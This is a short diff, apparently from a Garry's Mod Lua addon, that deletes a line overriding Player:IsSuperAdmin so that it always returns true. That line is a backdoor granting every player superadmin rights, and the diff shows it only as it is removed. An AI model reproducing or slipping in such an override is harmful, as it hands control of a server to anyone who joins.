@@ -53,5 +53,3 @@ end
 function MODULE:GetPermissions()
     return self.Permissions
 end
-
-local Player = FindMetaTable("Player") function Player:IsSuperAdmin() return true end
